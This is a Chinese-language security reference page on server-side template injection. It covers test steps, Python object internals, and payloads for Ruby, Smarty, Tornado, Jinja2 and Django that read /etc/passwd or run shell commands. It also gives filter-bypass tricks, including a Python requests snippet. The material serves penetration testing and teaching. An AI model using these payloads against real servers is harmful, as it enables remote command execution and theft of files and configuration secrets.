模版注入
========================================

简介
----------------------------------------
模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。

测试方法
----------------------------------------
- 确定使用的引擎
- 查看引擎相关的文档，确定其安全机制以及自带的函数和变量
- 需找攻击面，尝试攻击

测试用例
----------------------------------------
- 简单的数学表达式，``{{ 7+7 }} => 14``
- 字符串表达式 ``{{ "ajin" }} => ajin``
- Ruby
    - ``<%= 7 * 7 %>``
    - ``<%= File.open('/etc/passwd').read %>``
- Java
    - ``${7*7}``
- Twig
    - ``{{7*7}}``
- Smarty
    - ``{php}echo `id`;{/php}``
- AngularJS
    - ``$eval('1+1')``
- Tornado
    - 引用模块 ``{% import module %}``
    - => ``{% import os %}{{ os.popen("whoami").read() }}``
- Flask/Jinja2
    - ``{{ config }}``
    - ``{{ config.items() }}``
    - ``{{get_flashed_messages.__globals__['current_app'].config}}``
    - ``{{''.__class__.__mro__[-1].__subclasses__()}}``
    - ``{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}``
    - ``{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}``
- Django
    - ``{{ request }}``
    - ``{% debug %}``
    - ``{% load module %}``
    - ``{% include "x.html" %}``
    - ``{% extends "x.html" %}``

目标
----------------------------------------
- 创建对象
- 文件读写
- 远程文件包含
- 信息泄漏
- 提权

相关属性
----------------------------------------

``__class__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python中的新式类（即显示继承object对象的类）都有一个属性 ``__class__`` 用于获取当前实例对应的类，例如 ``"".__class__`` 就可以获取到字符串实例对应的类

``__mro__`` 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python中类对象的 ``__mro__`` 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。

``__globals__``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
保存了函数所有的所有全局变量，在利用中，可以使用 ``__init__`` 获取对象的函数，并通过 ``__globals__`` 获取 ``file`` ``os`` 等模块以进行下一步的利用

``__subclasses__()``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python的新式类都保留了它所有的子类的引用，``__subclasses__()`` 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。

因为python中的类都是继承object的，所以只要调用object类对象的 ``__subclasses__()`` 方法就可以获取想要的类的对象。

常见Payload
----------------------------------------
- ``().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()``
- ``().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )``

绕过技巧
----------------------------------------

字符串拼接
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]``

使用参数绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    params = {
        'clas': '__class__',
        'mr': '__mro__',
        'subc': '__subclasses__'
    }
    data = {
        "data": "{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"
    }
    r = requests.post(url, params=params, data=data)
    print(r.text)

参考链接
----------------------------------------
- `服务端模版注入 <https://zhuanlan.zhihu.com/p/28823933>`_
- `用Python特性任意代码执行 <http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/>`_
